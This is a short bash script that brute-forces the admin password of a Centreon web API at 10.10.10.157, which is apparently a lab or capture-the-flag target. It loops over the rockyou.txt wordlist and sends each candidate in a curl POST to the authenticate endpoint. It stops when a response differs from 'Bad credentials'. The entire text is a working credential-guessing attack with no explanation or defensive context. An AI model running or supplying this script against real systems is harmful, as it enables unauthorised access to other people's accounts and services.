input="/usr/share/wordlists/rockyou.txt"
while IFS= read -r line
do
  echo "$line"
  curl -d "username=admin&password=$line" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -o response.txt
  str="\"Bad credentials\""
  if [[ $(cat response.txt) != "$str" ]]; then
    echo "$line"
    break
  fi
done < "$input"
